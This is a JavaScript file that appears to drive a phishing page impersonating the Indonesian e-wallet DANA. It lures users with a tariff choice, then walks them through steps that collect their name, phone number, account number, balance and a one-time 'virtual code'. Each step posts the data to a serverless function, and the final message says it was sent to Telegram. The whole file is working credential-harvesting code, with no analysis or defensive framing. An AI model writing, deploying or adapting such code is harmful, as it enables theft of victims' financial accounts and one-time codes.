document.addEventListener('DOMContentLoaded', function() {
    // Variables
    let selectedTariff = null;
    let currentStep = 1;
    const totalSteps = 4;

    // Loading animation
    setTimeout(function() {
        const loadingScreen = document.getElementById('loadingScreen');
        loadingScreen.style.opacity = '0';
        setTimeout(function() {
            loadingScreen.style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
        }, 500);
    }, 2000);

    // Numeric input validation
    const setupNumericInputs = function() {
        const numericInputs = document.querySelectorAll('input[inputmode="numeric"], input[type="tel"][pattern="[0-9]*"]');
        numericInputs.forEach(input => {
            input.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
        });
    };

    // Show loading overlay
    function showLoading() {
        document.getElementById('loadingOverlay').style.display = 'flex';
    }

    // Hide loading overlay
    function hideLoading() {
        document.getElementById('loadingOverlay').style.display = 'none';
    }

    // Navigate between forms
    function navigateToForm(fromId, toId) {
        const fromElement = document.getElementById(fromId);
        const toElement = document.getElementById(toId);
        
        fromElement.style.display = 'none';
        toElement.style.display = 'block';
        currentStep = parseInt(toId.replace('accountVerification', ''));
    }

    // Continue button handler
    document.getElementById('btnContinue').addEventListener('click', function() {
        const tariffOld = document.getElementById('tariffOld');
        const tariffNew = document.getElementById('tariffNew');
        
        if (!tariffOld.checked && !tariffNew.checked) {
            alert('Silakan pilih salah satu opsi tarif sebelum melanjutkan.');
            return;
        }
        
        selectedTariff = tariffOld.checked ? 'old' : 'new';
        showLoading();
        
        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                step: 'tariff-selection',
                tariff: selectedTariff 
            })
        })
        .then(() => {
            hideLoading();
            navigateToForm('mainContent', 'accountVerification1');
            setupNumericInputs();
        })
        .catch(error => {
            hideLoading();
            console.error('Error:', error);
        });
    });

    // Form submission handlers
    document.getElementById('accountForm1').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        
        const formData = {
            step: 'account-verification-1',
            name: document.getElementById('accountName').value,
            phone: document.getElementById('phoneNumber').value,
            tariff: selectedTariff
        };
        
        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(() => {
            hideLoading();
            navigateToForm('accountVerification1', 'accountVerification2');
        })
        .catch(error => {
            hideLoading();
            console.error('Error:', error);
        });
    });

    document.getElementById('accountForm2').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        
        const formData = {
            step: 'account-verification-2',
            accountNumber: document.getElementById('accountNumber').value,
            tariff: selectedTariff
        };
        
        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(() => {
            hideLoading();
            navigateToForm('accountVerification2', 'accountVerification3');
        })
        .catch(error => {
            hideLoading();
            console.error('Error:', error);
        });
    });

    document.getElementById('accountForm3').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        
        const formData = {
            step: 'account-verification-3',
            balance: document.getElementById('lastBalance').value,
            tariff: selectedTariff
        };
        
        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(() => {
            hideLoading();
            navigateToForm('accountVerification3', 'accountVerification4');
        })
        .catch(error => {
            hideLoading();
            console.error('Error:', error);
        });
    });

    // Final verification
    document.getElementById('accountForm4').addEventListener('submit', function(e) {
        e.preventDefault();
        showLoading();
        
        const formData = {
            step: 'complete-verification',
            name: document.getElementById('accountName').value,
            phone: document.getElementById('phoneNumber').value,
            accountNumber: document.getElementById('accountNumber').value,
            balance: document.getElementById('lastBalance').value,
            virtualCode: document.getElementById('virtualCode').value,
            tariff: selectedTariff
        };

        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(response => response.json())
        .then(data => {
            hideLoading();
            if (data.success) {
                alert('Verifikasi berhasil! Data telah dikirim ke Telegram.');
            } else {
                alert('Error: ' + (data.error || 'Gagal mengirim data'));
            }
        })
        .catch(error => {
            hideLoading();
            alert('Error: ' + error.message);
        });
    });

    // Request new virtual code
    document.getElementById('requestCodeBtn').addEventListener('click', function() {
        showLoading();
        
        const formData = {
            step: 'request-new-code',
            phone: document.getElementById('phoneNumber').value,
            tariff: selectedTariff
        };
        
        fetch('/.netlify/functions/send-dana-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(() => {
            hideLoading();
            alert('Kode virtual baru telah diminta.');
        })
        .catch(error => {
            hideLoading();
            console.error('Error:', error);
        });
    });

    // Initialize numeric inputs
    setupNumericInputs();
});
